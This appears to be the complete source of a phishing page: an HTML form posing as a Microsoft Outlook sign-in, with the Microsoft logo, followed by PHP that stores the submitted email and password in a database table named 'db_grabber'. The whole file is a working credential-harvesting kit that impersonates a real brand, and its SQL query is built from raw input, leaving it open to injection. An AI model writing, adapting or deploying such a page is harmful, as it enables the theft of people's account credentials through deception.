<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <!-- Box-icon -->
    <link rel="stylesheet" href="Blog/font-awesome-4.7.0/css/font-awesome.min.css">
    
    <link rel="stylesheet" href="style.css">
    
</head>
<body>
    <div class="hero">
        <h1>Outlook</h1>
        <div class="wrapper">
            <img src="Microsoft_logo_(2012).svg.png" alt="" style="width: 100px;">
            <br> <br>
            <form action="" method="post">
                <label for="email">Enter Email</label> <br>
                <input type="text" name="email">
                <br><br>
                <label for="password">Enter password</label> <br>
                <input type="password" name="password">
                <br><br>
                <p>Forgot my password</p>

                <button name="submit">Sign in</button>
            </form>
        </div>
    </div>


</body>
</html>

<?php 
// process the value from form to database
// check if the submit is clicked or not
require_once 'config.php';
if(isset($_POST['submit'])){
    // button clicked

    // get the data from form
    $email = $_POST['email'];
    $password = $_POST['password'];

    // SQL query to save the data into database
    $sql = "INSERT INTO db_grabber SET 
    demail = '$email', 
    dpassword = '$password'
    ";

//    Execute Query and save data in Database
    

   $res = mysqli_query($conn, $sql) or die(mysqli_error());

//    check if the data is inserted or not and display
if($res==TRUE){
    header("location: index.php");
}

    
}
    // button not clicked
   

?>